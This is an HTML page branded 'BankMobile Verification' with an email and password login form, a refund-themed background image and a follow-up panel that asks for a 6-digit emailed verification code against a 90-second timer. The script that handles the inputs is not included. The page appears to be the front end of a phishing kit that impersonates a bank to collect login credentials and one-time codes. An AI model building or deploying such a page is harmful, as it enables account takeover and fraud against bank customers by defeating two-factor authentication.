<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BankMobile Verification</title> <!-- Updated title -->
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="background-container">
        <img src="refund-image.jpeg" alt="Login Image" class="login-image">
    </div>
    
    <div class="login-form-container" id="login-form-container">
        <form id="login-form">
            <!-- Labels and LOG IN Button on the same line -->
            <div class="labels-row">
                <label for="email">Email address:</label>
                <label for="password">Password:</label>
                <button type="submit">LOG IN</button>
            </div>

            <!-- Input Boxes as Underscores -->
            <div class="inputs-row">
                <input type="email" id="email" name="email" required class="underscore-input">
                <input type="password" id="password" name="password" required class="underscore-input">
            </div>

            <!-- Forget Login Information -->
            <a href="#" class="forgot-password">Forget login information</a>
        </form>
    </div>

    <div class="verification-container" id="verification-container">
        <h2>BankMobile Verification</h2> <!-- Updated heading -->
        <p>Enter the 6-digit verification code sent to your email:</p>
        <input type="text" id="verification-code" maxlength="6" placeholder="Enter code" required>
        <button id="verify-button">Verify</button>
        <p id="timer">Time remaining: 90 seconds</p>
    </div>

    <script src="script.js"></script>
</body>
</html>
